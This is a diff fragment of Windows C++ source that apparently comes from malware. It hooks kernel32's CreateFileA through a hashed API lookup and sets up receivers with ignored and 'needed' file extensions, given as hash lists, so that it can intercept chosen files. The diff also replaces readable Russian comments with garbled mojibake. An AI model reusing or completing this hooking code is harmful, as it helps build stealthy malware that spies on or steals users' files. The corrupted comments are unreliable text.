+	List::SetFreeItemMehod( receivers, DelReceiver ); //пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if( flags & CREATEFILEA )
 	{
 		if (!HookApi(DLL_KERNEL32, Hash_CreateFileA, &Hook_CreateFileA, &Real_CreateFileA ) )
@@ -425,7 +436,7 @@ bool AddReceiver( Receiver* rv )
 	return false;
 }
 
- //добавляет игнорируемые форматы файлов, которые указываются в начале файла
+ //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 bool AddIgnoreBeg( Receiver* rv, const char* beg )
 {
 	for( int i = 0; i < MaxIgnoreBeg; i++ )
@@ -434,8 +445,8 @@ bool AddIgnoreBeg( Receiver* rv, const char* beg )
 			int j;
 			for( j = 0; j < MaxLenIgnoreBeg && beg[j]; j++ )
 				rv->ignoreBeg[i][j] = beg[j];
-			//остаток забиваем нулями
-			rv->ignoreBeg[i][j++] = 0; //такой костыль, чтобы компилятор не просталял _memset, которая не линкуется
+			//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+			rv->ignoreBeg[i][j++] = 0; //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ _memset, пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 			for( ; j < MaxLenIgnoreBeg; j++ )
 				rv->ignoreBeg[i][j] = rv->ignoreBeg[i][j - 1];
 			return true;
@@ -445,7 +456,7 @@ bool AddIgnoreBeg( Receiver* rv, const char* beg )
 
 static DWORD* CopyArrayExt( const DWORD* m )
 {
-	//считаем колоичество элементов
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	const DWORD* pm = m;
 	while( *pm++ );
 	int sz = (pm - m) * sizeof(DWORD);
@@ -455,7 +466,7 @@ static DWORD* CopyArrayExt( const DWORD* m )
 	return ret;
 }
 
-//добавляет массив хешей игнорируемых расширений файлов, должен заканчиваться нулем
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 bool AddIgnoreExt( Receiver* rv, const DWORD* m )
 {
 	rv->ignoreExt = CopyArrayExt(m);
@@ -464,7 +475,7 @@ bool AddIgnoreExt( Receiver* rv, const DWORD* m )
 	return false;
 }
 
-//добавляет массив хешей нужных нам расширений файлов, должен заканчиваться нулем
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 bool AddNeededExt( Receiver* rv, const DWORD* m )
 {
 	rv->neededExt = CopyArrayExt(m);
